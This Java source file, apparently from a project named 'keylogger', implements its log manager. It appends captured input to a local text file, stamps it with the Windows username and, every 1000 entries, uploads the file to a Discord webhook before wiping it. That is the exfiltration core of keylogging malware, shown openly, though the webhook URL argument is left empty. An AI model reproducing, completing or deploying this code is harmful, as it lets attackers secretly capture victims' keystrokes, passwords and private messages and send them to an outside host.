package cf.lucasmellof.keylogger;

import club.minnced.discord.webhook.WebhookClient;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.nio.channels.FileChannel;
import java.nio.file.StandardOpenOption;

public class LogManager {
    public File folder;
    public String filename;
    private File FILE;
    public int a = 0;
    WebhookClient client = WebhookClient.withUrl();

    public LogManager(File folder, String filename) {
        this.folder = folder;
        this.filename = filename;
        FILE = new File(folder.toString(), filename + ".txt");
    }

    public void log(String message) {
        logToFile(message);
        logToDiscord();
    }

    private void logToFile(String message) {
        try {
            File dataFolder = folder;
            if (!dataFolder.exists()) {
                dataFolder.mkdir();
            }

            if (!FILE.exists()) {
                FILE.createNewFile();
            }

            FileWriter fw = new FileWriter(FILE, true);
            PrintWriter pw = new PrintWriter(fw);
            pw.println(message);
            pw.flush();
            pw.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void logToDiscord() {
        a++;
        if (a >= 1000) {
            a = 0;
            logToFile("Finalizando o arquivo aqui, User:"+ System.getenv("username"));
            client.send(FILE);
            try {
                FileChannel.open(FILE.toPath(), StandardOpenOption.WRITE).truncate(0).close();
                logToFile("Iniciando o arquivo aqui, User:"+ System.getenv("username"));
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
